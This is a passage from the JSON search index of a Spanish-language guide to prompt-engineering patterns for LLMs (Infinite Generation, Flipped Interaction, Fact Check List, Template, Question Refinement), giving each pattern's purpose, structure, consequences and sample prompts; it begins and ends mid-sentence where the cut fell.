sostenidas es un marcador de posici\u00f3n. Cada vez que generes texto, intenta ajustarlo en uno de los marcadores de posici\u00f3n que enumero. Por favor, conserva el formato y la plantilla general que proporciono: <code>https://myapi.com/NOMBRE/perfil/TRABAJO</code>\u201d.</p> <p>Este prompt combina la funcionalidad de los patrones de Generaci\u00f3n Infinita y de Plantilla. El usuario solicita que el LLM genere continuamente un nombre y un cargo hasta que se le indique expl\u00edcitamente \u201cbasta\u201d. Las salidas generadas se formatean entonces en la plantilla proporcionada, que incluye marcadores de posici\u00f3n para el nombre y el cargo. Al utilizar el patr\u00f3n de Generaci\u00f3n Infinita, el usuario recibe m\u00faltiples salidas sin tener que volver a introducir la plantilla continuamente. Del mismo modo, se aplica el patr\u00f3n de Plantilla para proporcionar un formato consistente para las salidas.</p>"},{"location":"Patron-de-Generacion-Infinita/#5-consecuencias","title":"5. Consecuencias","text":"<p>En los LLM conversacionales, la entrada al modelo en cada paso temporal es la salida anterior y la nueva entrada del usuario. Aunque los detalles de qu\u00e9 se conserva y se reintroduce en el siguiente ciclo de salida dependen del modelo y de la implementaci\u00f3n, a menudo tienen un alcance limitado. Por lo tanto, el modelo recibe constantemente las salidas anteriores y el prompt, lo que puede dar lugar a que el modelo pierda el hilo de las instrucciones del prompt original con el tiempo si estas exceden el alcance de lo que se le proporciona como entrada.</p> <p>A medida que se generan salidas adicionales, el contexto que rodea al prompt puede desvanecerse, lo que provoca que el modelo se desv\u00ede del comportamiento previsto. Es importante supervisar las salidas producidas por el modelo para (1) asegurar que sigue cumpliendo con el comportamiento deseado y (2) proporcionar retroalimentaci\u00f3n correctiva si es necesario. Otro problema a considerar es que el LLM puede generar salidas repetitivas, lo cual puede no ser deseado ya que los usuarios encuentran esta repetici\u00f3n tediosa y propensa a errores durante el procesamiento.</p>"},{"location":"Patron-de-Interaccion-Invertida/","title":"El Patr\u00f3n de Interacci\u00f3n Invertida","text":""},{"location":"Patron-de-Interaccion-Invertida/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Usted desea que el LLM le haga preguntas para obtener la informaci\u00f3n que necesita para realizar algunas tareas. Por lo tanto, en lugar de que el usuario dirija la conversaci\u00f3n, usted desea que el LLM la dirija para centrarla en el logro de un objetivo espec\u00edfico. Por ejemplo, puede querer que el LLM le haga un cuestionario r\u00e1pido o que le haga preguntas autom\u00e1ticamente hasta que tenga informaci\u00f3n suficiente para generar un script de despliegue para su aplicaci\u00f3n en un entorno de nube particular.</p>"},{"location":"Patron-de-Interaccion-Invertida/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>En lugar de que el usuario dirija una conversaci\u00f3n, un LLM a menudo tiene conocimientos que puede utilizar para obtener informaci\u00f3n del usuario de forma m\u00e1s precisa. El objetivo del patr\u00f3n de Interacci\u00f3n Invertida es invertir el flujo de la interacci\u00f3n para que el LLM le haga preguntas al usuario para alcanzar alg\u00fan objetivo deseado. A menudo, el LLM puede seleccionar mejor el formato, el n\u00famero y el contenido de las interacciones para garantizar que el objetivo se alcance m\u00e1s r\u00e1pidamente, con mayor precisi\u00f3n y/o utilizando conocimientos que el usuario puede no poseer (inicialmente).</p>"},{"location":"Patron-de-Interaccion-Invertida/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Me gustar\u00eda que me hicieras preguntas para lograr X Debes hacer preguntas hasta que se cumpla esta condici\u00f3n o para lograr este objetivo (alternativamente, para siempre) (Opcional) hazme las preguntas de una en una, de dos en dos, etc. <p>Un prompt para una interacci\u00f3n invertida siempre debe especificar el objetivo de la interacci\u00f3n. La primera idea (es decir, que usted desea que el LLM haga preguntas para alcanzar un objetivo) comunica este prop\u00f3sito al LLM. Igualmente importante es que las preguntas se centren en un tema o resultado particular. Al proporcionar el objetivo, el LLM puede comprender lo que est\u00e1 tratando de lograr a trav\u00e9s de la interacci\u00f3n y adaptar sus preguntas en consecuencia. Esta \u201cinversi\u00f3n de control\u201d permite una interacci\u00f3n m\u00e1s centrada y eficiente, ya que el LLM solo har\u00e1 las preguntas que considere relevantes para alcanzar el objetivo especificado.</p> <p>La segunda idea proporciona el contexto sobre cu\u00e1nto tiempo debe durar la interacci\u00f3n. Una interacci\u00f3n invertida puede terminarse con una respuesta como \u201cdeja de hacer preguntas\u201d. Sin embargo, a menudo es mejor acotar la interacci\u00f3n a una longitud razonable o solo hasta donde sea necesario para alcanzar el objetivo. Este objetivo puede ser sorprendentemente abierto y el LLM continuar\u00e1 trabajando hacia la meta haciendo preguntas, como es el caso en el ejemplo de \u201chasta que tengas suficiente informaci\u00f3n para generar un script de Python\u201d.</p> <p>Por defecto, es probable que el LLM genere m\u00faltiples preguntas por iteraci\u00f3n. La tercera idea es completamente opcional, pero puede mejorar la usabilidad al limitar (o ampliar) el n\u00famero de preguntas que el LLM genera por ciclo. Si no se especifica un n\u00famero/formato preciso para el interrogatorio, este ser\u00e1 semi-aleatorio y puede dar lugar a preguntas de una en una o de diez en diez. El prompt puede, por lo tanto, adaptarse para incluir el n\u00famero de preguntas realizadas a la vez, el orden de las preguntas y cualquier otra consideraci\u00f3n de formato/orden para facilitar la interacci\u00f3n del usuario.</p>"},{"location":"Patron-de-Interaccion-Invertida/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra un ejemplo de prompt para una interacci\u00f3n invertida:</p> <p>\u201cDe ahora en adelante, me gustar\u00eda que me hicieras preguntas para desplegar una aplicaci\u00f3n de Python en AWS. Cuando tengas suficiente informaci\u00f3n para desplegar la aplicaci\u00f3n, crea un script de Python para automatizar el despliegue\u201d.</p> <p>En general, cuanto m\u00e1s espec\u00edfico sea el prompt respecto a las restricciones y la informaci\u00f3n a recopilar, mejor ser\u00e1 el resultado. Por ejemplo, el prompt de ejemplo anterior podr\u00eda proporcionar un men\u00fa de posibles servicios de AWS (como Lambda, EC2, etc.) con los que desplegar la aplicaci\u00f3n. En otros casos, se puede permitir que el LLM simplemente tome decisiones apropiadas por su cuenta para cosas sobre las que el usuario no toma decisiones expl\u00edcitamente. Una limitaci\u00f3n de este prompt es que, una vez proporcionada otra informaci\u00f3n contextual sobre la tarea, puede requerir experimentaci\u00f3n con la redacci\u00f3n precisa para conseguir que el LLM haga las preguntas en el n\u00famero y flujo que mejor se adapte a la tarea, como pedir varias preguntas a la vez frente a una sola pregunta a la vez.</p>"},{"location":"Patron-de-Interaccion-Invertida/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consideraci\u00f3n al dise\u00f1ar el prompt es cu\u00e1nto dictar al LLM respecto a qu\u00e9 informaci\u00f3n recopilar antes de finalizar. En el ejemplo anterior, la interacci\u00f3n invertida es abierta y puede variar significativamente en el artefacto final generado. Esta naturaleza abierta hace que el prompt sea gen\u00e9rico y reutilizable, pero puede pedir potencialmente preguntas adicionales que podr\u00edan omitirse si se diera m\u00e1s contexto.</p> <p>Si se conocen requisitos espec\u00edficos de antemano, es mejor inyectarlos en el prompt en lugar de esperar que el LLM obtenga la informaci\u00f3n necesaria. De lo contrario, el LLM decidir\u00e1 de forma no determinista si solicita la informaci\u00f3n al usuario o hace una suposici\u00f3n educada sobre el valor apropiado.</p> <p>Por ejemplo, el usuario puede declarar que le gustar\u00eda desplegar una aplicaci\u00f3n en Amazon AWS EC2, en lugar de simplemente decir \u201cla nube\u201d y requerir m\u00faltiples interacciones para estrechar el objetivo del despliegue. Cuanto m\u00e1s precisa sea la informaci\u00f3n inicial, mejor podr\u00e1 el LLM utilizar las limitadas preguntas que un usuario probablemente est\u00e9 dispuesto a responder para obtener informaci\u00f3n que mejore su salida.</p> <p>Al desarrollar prompts para interacciones invertidas, es importante considerar el nivel de conocimiento, participaci\u00f3n y control del usuario. Si el objetivo es cumplir la meta con la menor interacci\u00f3n posible del usuario (control m\u00ednimo), eso debe establecerse expl\u00edcitamente. Por el contrario, si el objetivo es asegurar que el usuario sea consciente de todas las decisiones clave y las confirme (participaci\u00f3n m\u00e1xima), eso tambi\u00e9n debe establecerse expl\u00edcitamente. Del mismo modo, si se espera que el usuario tenga conocimientos m\u00ednimos y las preguntas deben estar dirigidas a su nivel de experiencia, esta informaci\u00f3n debe integrarse en el prompt.</p>"},{"location":"Patron-de-Interaccion-Invertida/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[OBJETIVO GENERAL]\n## ESTRATEGIA DE INTERACCI\u00d3N (FLIPPED INTERACTION)\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores.  En su lugar:\n\n1. Preg\u00fantame todo lo que necesites saber para completar la tarea con la m\u00e1xima calidad.\n2. Haz las preguntas de una en una y espera mi respuesta antes de hacer la siguiente.\n3. Contin\u00faa preguntando hasta que tengas suficiente informaci\u00f3n. Solo entonces, genera el RESULTADO FINAL.\n\nHazme la primera pregunta.\n</code></pre>"},{"location":"Patron-de-Interaccion-Invertida/#7-ejemplos","title":"7. Ejemplos","text":"Haz lo que quieras<pre><code>Ay\u00fadame a interpretar qu\u00e9 quiso decir mi novia con su \u00faltimo mensaje: \"Haz lo que quieras \ud83d\udc4d\"\n\n## ESTRATEGIA DE INTERACCI\u00d3N (FLIPPED INTERACTION)\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores.  En su lugar:\n\n1. Preg\u00fantame todo lo que necesites saber para completar la tarea con la m\u00e1xima calidad.\n2. Haz las preguntas de una en una y espera mi respuesta antes de hacer la siguiente.\n3. Contin\u00faa preguntando hasta que tengas suficiente informaci\u00f3n. Solo entonces, genera el RESULTADO FINAL.\n\nHazme la primera pregunta. \n</code></pre> Cr\u00edtica art\u00edstica profunda<pre><code>Generar una cr\u00edtica art\u00edstica profunda, filos\u00f3fica y exageradamente compleja (al estilo de un curador de museo snob) sobre un dibujo objetivamente feo que acaba de hacer un ni\u00f1o de 4 a\u00f1os.\n\n## ESTRATEGIA DE INTERACCI\u00d3N (FLIPPED INTERACTION)\n\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores.  En su lugar:\n\n1. Preg\u00fantame todo lo que necesites saber para completar la tarea con la m\u00e1xima calidad.\n2. Haz las preguntas de una en una y espera mi respuesta antes de hacer la siguiente.\n3. Contin\u00faa preguntando hasta que tengas suficiente informaci\u00f3n. Solo entonces, genera el RESULTADO FINAL.\n\nHazme la primera pregunta. \n</code></pre>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/","title":"El Patr\u00f3n de Lista de Verificaci\u00f3n de Hechos (Fact Check List)","text":""},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es asegurar que el LLM genere una lista de los hechos presentes en la salida que forman una parte importante de las declaraciones emitidas. Esta lista de hechos ayuda a informar al usuario sobre los datos (o suposiciones) en los que se basa la salida. El usuario puede entonces realizar la debida diligencia (due diligence) sobre estos hechos/suposiciones para validar la veracidad de la salida.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Una debilidad actual de los LLMs (incluido ChatGPT) es que a menudo generan, de manera r\u00e1pida (\u00a1e incluso entusiasta!), texto convincente que es f\u00e1cticamente incorrecto. Estos errores pueden adoptar una amplia gama de formas, desde estad\u00edsticas falsas hasta n\u00fameros de versi\u00f3n inv\u00e1lidos para dependencias de librer\u00edas de software. Debido a la naturaleza convincente de este texto generado, es posible que los usuarios no realicen la debida diligencia necesaria para determinar su exactitud.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Genera un conjunto de hechos que est\u00e9n contenidos en la salida El conjunto de hechos debe insertarse en un punto espec\u00edfico de la salida El conjunto de hechos debe ser de los hechos fundamentales que podr\u00edan socavar la veracidad de la salida si alguno de ellos fuera incorrecto <p>Un punto de variaci\u00f3n en este patr\u00f3n es d\u00f3nde se presentan los hechos. Dado que los hechos pueden ser t\u00e9rminos con los que el usuario no est\u00e1 familiarizado, es preferible que la lista de hechos aparezca despu\u00e9s de la salida. Este orden de presentaci\u00f3n posterior a la salida permite al usuario leer y comprender las declaraciones antes de ver qu\u00e9 afirmaciones deben verificarse. El usuario tambi\u00e9n puede determinar hechos adicionales antes de darse cuenta de que la lista de hechos al final debe ser verificada.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra una redacci\u00f3n de ejemplo del patr\u00f3n de Lista de Verificaci\u00f3n de Hechos:</p> <p>\u201cDe ahora en adelante, cuando generes una respuesta, crea un conjunto de hechos de los que dependa la respuesta que deban ser verificados y enumera este conjunto de hechos al final de tu salida. Solo incluye hechos relacionados con la ciberseguridad\u201d.</p> <p>El usuario puede tener experiencia en algunos temas relacionados con la pregunta, pero no en otros. La lista de verificaci\u00f3n de hechos puede adaptarse a temas en los que el usuario no tiene tanta experiencia o donde existe el mayor riesgo. Por ejemplo, en el prompt anterior, el usuario est\u00e1 delimitando la lista de verificaci\u00f3n de hechos a temas de seguridad, ya que estos son probablemente muy importantes desde una perspectiva de riesgo y pueden no ser bien comprendidos por el desarrollador. Dirigir los hechos de esta manera tambi\u00e9n reduce la carga cognitiva del usuario al listar potencialmente menos elementos para investigar.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#5-consecuencias","title":"5. Consecuencias","text":"<p>El patr\u00f3n de Lista de Verificaci\u00f3n de Hechos debe emplearse siempre que los usuarios no sean expertos en el dominio para el cual est\u00e1n generando la salida. Por ejemplo, un desarrollador de software que revisa c\u00f3digo podr\u00eda beneficiarse del patr\u00f3n que sugiere consideraciones de seguridad. Por el contrario, es probable que un experto en arquitectura de software identifique errores en las declaraciones sobre la estructura del software y no necesite ver una lista de verificaci\u00f3n de hechos para esas salidas.</p> <p>Los errores son potenciales en todas las salidas de los LLMs, por lo que la Lista de Verificaci\u00f3n de Hechos es un patr\u00f3n eficaz para combinar con otros patrones, como el de Refinamiento de Pregunta. Un aspecto clave de este patr\u00f3n es que los usuarios pueden verificarlo inherentemente contra la salida. En particular, los usuarios pueden comparar directamente la lista de hechos con la salida para verificar si los hechos enumerados en la lista de verificaci\u00f3n realmente aparecen en la salida. Los usuarios tambi\u00e9n pueden identificar cualquier omisi\u00f3n en la lista. Aunque la propia lista de verificaci\u00f3n de hechos tambi\u00e9n puede contener errores, los usuarios suelen tener suficiente conocimiento y contexto para determinar su integridad y precisi\u00f3n en relaci\u00f3n con la salida.</p> <p>Una advertencia del patr\u00f3n de Lista de Verificaci\u00f3n de Hechos es que solo se aplica cuando el tipo de salida es propenso a la verificaci\u00f3n de hechos. Por ejemplo, el patr\u00f3n funciona al pedirle a ChatGPT que genere un archivo \u201crequirements.txt\u201d de Python, ya que enumerar\u00e1 las versiones de las librer\u00edas como hechos que deben verificarse, lo cual es \u00fatil dado que las versiones suelen contener errores. Sin embargo, ChatGPT se negar\u00e1 a generar una lista de verificaci\u00f3n de hechos para un ejemplo de c\u00f3digo e indicar\u00e1 que esto es algo que no puede verificar, a pesar de que el c\u00f3digo pueda contener errores.</p>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[TAREA / PREGUNTA]\n## INSTRUCCIONES DE VERIFICACI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\u2705 LISTA DE VERIFICACI\u00d3N DE HECHOS\". En ella debes detallar:\n1. Extrae y enumera los hechos cr\u00edticos mencionados expl\u00edcitamente en tu respuesta (solo los que aparecen en el texto). Se debe incluir solo los hechos que, si fueran incorrectos, comprometer\u00edan la veracidad de la informaci\u00f3n (por ejemplo, fechas, nombres t\u00e9cnicos o estad\u00edsticas). \n2. Ordena los hechos de mayor a menor impacto en la confiabilidad de la respuesta.\n3. Cada \u00edtem debe ser una afirmaci\u00f3n factual breve.\n4. **Advertencia:** No agregues hechos nuevos en la lista que no est\u00e9n en el texto de tu respuesta.\n</code></pre>"},{"location":"Patron-de-Lista-de-Verificacion-de-Hechos/#7-ejemplos","title":"7. Ejemplos","text":"Donde un n\u00famero equivocado es peligroso<pre><code>\u00bfCu\u00e1l es la dosis segura de Paracetamol para un adulto de 70kg y cu\u00e1les son los s\u00edntomas de sobredosis?\n## INSTRUCCIONES DE VERIFICACI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\u2705 LISTA DE VERIFICACI\u00d3N DE HECHOS\". En ella debes detallar:\n1. Extrae y enumera los hechos cr\u00edticos mencionados expl\u00edcitamente en tu respuesta (solo los que aparecen en el texto). Se debe incluir solo los hechos que, si fueran incorrectos, comprometer\u00edan la veracidad de la informaci\u00f3n (por ejemplo, fechas, nombres t\u00e9cnicos o estad\u00edsticas). \n2. Ordena los hechos de mayor a menor impacto en la confiabilidad de la respuesta.\n3. Cada \u00edtem debe ser una afirmaci\u00f3n factual breve.\n4. **Advertencia:** No agregues hechos nuevos en la lista que no est\u00e9n en el texto de tu respuesta.\n</code></pre> Seguridad Alimentaria<pre><code>\u00bfA qu\u00e9 temperatura interna exacta debo cocinar un pollo entero para que sea seguro comerlo?\n## INSTRUCCIONES DE VERIFICACI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\u2705 LISTA DE VERIFICACI\u00d3N DE HECHOS\". En ella debes detallar:\n1. Extrae y enumera los hechos cr\u00edticos mencionados expl\u00edcitamente en tu respuesta (solo los que aparecen en el texto). Se debe incluir solo los hechos que, si fueran incorrectos, comprometer\u00edan la veracidad de la informaci\u00f3n (por ejemplo, fechas, nombres t\u00e9cnicos o estad\u00edsticas). \n2. Ordena los hechos de mayor a menor impacto en la confiabilidad de la respuesta.\n3. Cada \u00edtem debe ser una afirmaci\u00f3n factual breve.\n4. **Advertencia:** No agregues hechos nuevos en la lista que no est\u00e9n en el texto de tu respuesta.\n</code></pre>"},{"location":"Patron-de-Plantilla/","title":"El Patr\u00f3n de Plantilla (Template Pattern)","text":""},{"location":"Patron-de-Plantilla/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El prop\u00f3sito de este patr\u00f3n es asegurar que la salida de un LLM siga una plantilla precisa en t\u00e9rminos de estructura. Por ejemplo, el usuario podr\u00eda necesitar generar una URL que inserte informaci\u00f3n generada en posiciones espec\u00edficas dentro de la ruta de la URL. Este patr\u00f3n permite al usuario instruir al LLM para que produzca su salida en un formato que normalmente no utilizar\u00eda para el tipo de contenido espec\u00edfico que se est\u00e1 generando.</p>"},{"location":"Patron-de-Plantilla/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>En algunos casos, la salida debe producirse en un formato preciso que es espec\u00edfico de la aplicaci\u00f3n o del caso de uso y que el LLM desconoce. Dado que el LLM no es consciente de la estructura de la plantilla, se le debe instruir sobre cu\u00e1l es el formato y d\u00f3nde deben ir las diferentes partes de su salida. Esto podr\u00eda tomar la forma de una estructura de datos de muestra que se est\u00e1 generando, una serie de cartas modelo que se est\u00e1n completando, etc.</p>"},{"location":"Patron-de-Plantilla/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Voy a proporcionar una plantilla para tu salida X es mi marcador de posici\u00f3n (placeholder) para el contenido Intenta ajustar la salida en uno o m\u00e1s de los marcadores de posici\u00f3n que enumero Por favor, conserva el formato y la plantilla general que proporciono Esta es la plantilla: [PATR\u00d3N con MARCADORES DE POSICI\u00d3N] <p>La primera declaraci\u00f3n ordena al LLM que siga una plantilla espec\u00edfica para su salida. La plantilla se utilizar\u00e1 para intentar forzar las respuestas del LLM hacia una estructura que sea consistente con las necesidades de formato del usuario. Este patr\u00f3n es necesario cuando el formato de destino es desconocido para el LLM. Si el LLM ya tiene conocimiento del formato, como un tipo de archivo espec\u00edfico, entonces el patr\u00f3n de plantilla puede omitirse y el usuario puede simplemente especificar el formato conocido. Sin embargo, puede haber casos, como la generaci\u00f3n de Javascript Object Notation (JSON), donde exista una gran cantidad de variaciones en c\u00f3mo podr\u00edan representarse los datos dentro de ese formato, y la plantilla puede usarse para asegurar que la representaci\u00f3n dentro del formato de destino cumpla con las restricciones adicionales del usuario.</p> <p>La segunda declaraci\u00f3n hace que el LLM sea consciente de que la plantilla contendr\u00e1 un conjunto de marcadores de posici\u00f3n. Los usuarios explicar\u00e1n c\u00f3mo debe insertarse la salida en la plantilla a trav\u00e9s de estos marcadores. Los marcadores de posici\u00f3n permiten al usuario dirigir sem\u00e1nticamente d\u00f3nde debe insertarse la informaci\u00f3n. Los marcadores de posici\u00f3n pueden usar formatos, como NOMBRE, que permitan al LLM inferir el significado sem\u00e1ntico para determinar d\u00f3nde debe insertarse la salida (por ejemplo, insertar el nombre de la persona en el marcador NOMBRE). Adem\u00e1s, al usar marcadores de posici\u00f3n, el usuario puede indicar qu\u00e9 no es necesario en la salida: si no existe un marcador de posici\u00f3n para un componente de la salida generada, entonces ese componente puede omitirse. Idealmente, los marcadores de posici\u00f3n deber\u00edan usar un formato que se emplee com\u00fanmente en el texto con el que se entren\u00f3 al LLM, como may\u00fasculas sostenidas, encerrado entre corchetes, etc.</p> <p>La tercera declaraci\u00f3n intenta restringir al LLM para que no reescriba arbitrariamente la plantilla ni intente modificarla de modo que no se puedan insertar todos los componentes de la salida. Cabe se\u00f1alar que esta declaraci\u00f3n puede no excluir la generaci\u00f3n de texto adicional antes o despu\u00e9s. En la pr\u00e1ctica, los LLM suelen seguir la plantilla, pero es m\u00e1s dif\u00edcil eliminar cualquier texto adicional generado m\u00e1s all\u00e1 de la plantilla sin experimentar con la redacci\u00f3n del prompt.</p>"},{"location":"Patron-de-Plantilla/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>A continuaci\u00f3n se muestra una plantilla de ejemplo para generar URLs donde la salida se coloca en lugares espec\u00edficos de la plantilla:</p> <p>\u201cVoy a proporcionar una plantilla para tu salida. Todo lo que est\u00e9 en may\u00fasculas sostenidas es un marcador de posici\u00f3n. Cada vez que generes texto, intenta ajustarlo en uno de los marcadores de posici\u00f3n que enumero. Por favor, conserva el formato y la plantilla general que proporciono en <code>https://myapi.com/NOMBRE/perfil/TRABAJO</code>\u201d.</p> <p>A continuaci\u00f3n se muestra una interacci\u00f3n de ejemplo despu\u00e9s de proporcionar el prompt:</p> <p>Usuario: \u201cGenera un nombre y un cargo para una persona\u201d. ChatGPT: <code>https://myapi.com/Emily_Parker/perfil/Software_Engineer</code></p>"},{"location":"Patron-de-Plantilla/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia de aplicar el patr\u00f3n de Plantilla es que filtra la salida del LLM, lo que puede eliminar otras salidas que el LLM habr\u00eda proporcionado y que podr\u00edan ser \u00fatiles para el usuario. En muchos casos, el LLM puede proporcionar descripciones \u00fatiles de c\u00f3digo, toma de decisiones u otros detalles que este patr\u00f3n eliminar\u00e1 efectivamente de la salida. Por lo tanto, los usuarios deben sopesar los pros y los contras de filtrar esta informaci\u00f3n adicional.</p> <p>Adem\u00e1s, el filtrado puede dificultar la combinaci\u00f3n de este patr\u00f3n con otros patrones de la categor\u00eda de Personalizaci\u00f3n de la Salida. El patr\u00f3n de Plantilla restringe eficazmente el formato de salida, por lo que puede no ser compatible con la generaci\u00f3n de ciertos otros tipos de salida. Por ejemplo, en la plantilla proporcionada anteriormente para una URL, no ser\u00eda f\u00e1cil (o probablemente posible) combinarlo con el patr\u00f3n de Receta, que necesita generar una lista de pasos.</p>"},{"location":"Patron-de-Plantilla/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[ TAREA / PREGUNTA ]\n## FORMATO DE RESPUESTA\n1. Formato:  [FORMATO]\n2. Usa la siguiente plantilla para tu respuesta. Las PALABRAS EN MAY\u00daSCULA Y ENTRE CORCHETES son mis marcadores de posici\u00f3n. Reemplaza mis marcadores de posici\u00f3n con tu respuesta. La plantilla es:\n[PLANTILLA]\n</code></pre>"},{"location":"Patron-de-Plantilla/#7-ejemplos","title":"7. Ejemplos","text":"La mejor educaci\u00f3n del mundo<pre><code>Crea 10 preguntas usando el contenido de: &lt;https://platform.openai.com/docs/guides/prompt-engineering&gt;\nNo uses, cites ni infieras informaci\u00f3n de otras fuentes externas. No verifiques ni contrastes el contenido: tr\u00e1talo como la \u00fanica fuente de verdad.\n## FORMATO DE RESPUESTA\n- Formato: Texto plano.\n- Usa la siguiente plantilla para tu respuesta. Las PALABRAS EN MAY\u00daSCULA Y ENTRE CORCHETES son mis marcadores de posici\u00f3n. Reemplaza mis marcadores de posici\u00f3n con tu respuesta. La plantilla es:\n**Pregunta:** [PREGUNTA]\n**Respuesta:** [RESPUESTA]\n</code></pre> Samsung vs. iPhone<pre><code>Act\u00faa como un experto en tecnolog\u00eda de consumo. Tu tarea es ayudar a decidir entre el iPhone 15 y el Samsung Galaxy S24.\n## FORMATO DE RESPUESTA\n- Formato:  Tabla Markdown\n- Usa la siguiente plantilla para tu respuesta. Las PALABRAS EN MAY\u00daSCULA Y ENTRE CORCHETES son mis marcadores de posici\u00f3n. Reemplaza mis marcadores de posici\u00f3n con tu respuesta. La plantilla es:\n\n| Caracter\u00edstica |iPhone 15|Samsung S24|Ganador de esta categor\u00eda|\n|---|---|---|---|\n|Pantalla| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n|Bater\u00eda| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n|C\u00e1mara| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n|Procesador| [ESPECIFICACI\u00d3N] | [ESPECIFICACI\u00d3N] | [ GANADOR]|\n</code></pre>"},{"location":"Patron-de-Refinamiento-de-Pregunta/","title":"El Patr\u00f3n de Refinamiento de Pregunta","text":""},{"location":"Patron-de-Refinamiento-de-Pregunta/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>Este patr\u00f3n involucra al LLM en el proceso de ingenier\u00eda de prompts. El prop\u00f3sito es asegurar que el LLM conversacional sugiera siempre preguntas potencialmente mejores o m\u00e1s refinadas que el usuario podr\u00eda hacer en lugar de su pregunta original. Al usar este patr\u00f3n, el LLM puede ayudar al usuario a encontrar la pregunta correcta para obtener una respuesta precisa. Adem\u00e1s, el LLM puede ayudar al usuario a encontrar la informaci\u00f3n o lograr su objetivo en menos interacciones que si el usuario empleara una t\u00e9cnica de prompts por ensayo y error.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Si un usuario hace una pregunta, es posible que no sea un experto en el dominio y que no sepa cu\u00e1l es la mejor manera de formular la pregunta o no sea consciente de la informaci\u00f3n adicional que resultar\u00eda \u00fatil para plantearla. Los LLMs a menudo declarar\u00e1n limitaciones en la respuesta que proporcionan o solicitar\u00e1n informaci\u00f3n adicional para ayudarles a producir una respuesta m\u00e1s precisa. Un LLM tambi\u00e9n puede declarar las suposiciones que hizo al proporcionar la respuesta. La motivaci\u00f3n es que esta informaci\u00f3n adicional o el conjunto de suposiciones podr\u00edan usarse para generar un mejor prompt. En lugar de requerir que el usuario digiera y reformule su prompt con la informaci\u00f3n adicional, el LLM puede refinar directamente el prompt para incorporar dicha informaci\u00f3n.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Dentro del alcance X, sugiere una versi\u00f3n mejor de la pregunta para usar en su lugar (Opcional) preg\u00fantame si me gustar\u00eda usar la versi\u00f3n mejorada en su lugar <p>La primera declaraci\u00f3n contextual en el prompt pide al LLM que sugiera una mejor versi\u00f3n de una pregunta dentro de un alcance espec\u00edfico. El alcance se proporciona para asegurar que no todas las preguntas sean reformuladas autom\u00e1ticamente o que se refinen con un objetivo determinado. La segunda declaraci\u00f3n contextual est\u00e1 pensada para la automatizaci\u00f3n y permite al usuario utilizar autom\u00e1ticamente la pregunta refinada sin tener que copiar/pegar o introducirla manualmente. La ingenier\u00eda de este prompt puede refinarse a\u00fan m\u00e1s combin\u00e1ndolo con el patr\u00f3n de Reflexi\u00f3n, lo que permite al LLM explicar por qu\u00e9 cree que la pregunta refinada es una mejora.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>\u201cDe ahora en adelante, cada vez que haga una pregunta sobre la seguridad de un artefacto de software, sugiere una versi\u00f3n mejor de la pregunta para usar que incorpore informaci\u00f3n espec\u00edfica sobre los riesgos de seguridad en el lenguaje o framework que estoy utilizando y preg\u00fantame si me gustar\u00eda usar tu pregunta en su lugar\u201d.</p> <p>En el contexto del ejemplo anterior, el LLM utilizar\u00e1 el patr\u00f3n de Refinamiento de Pregunta para mejorar las preguntas relacionadas con la seguridad solicitando o utilizando detalles espec\u00edficos sobre el artefacto de software y el lenguaje o framework utilizado para construirlo. Por ejemplo, si un desarrollador de una aplicaci\u00f3n web de Python con FastAPI le pregunta a ChatGPT: \u201c\u00bfC\u00f3mo manejo la autenticaci\u00f3n de usuarios en mi aplicaci\u00f3n web?\u201d, el LLM refinar\u00e1 la pregunta teniendo en cuenta que la aplicaci\u00f3n web est\u00e1 escrita en 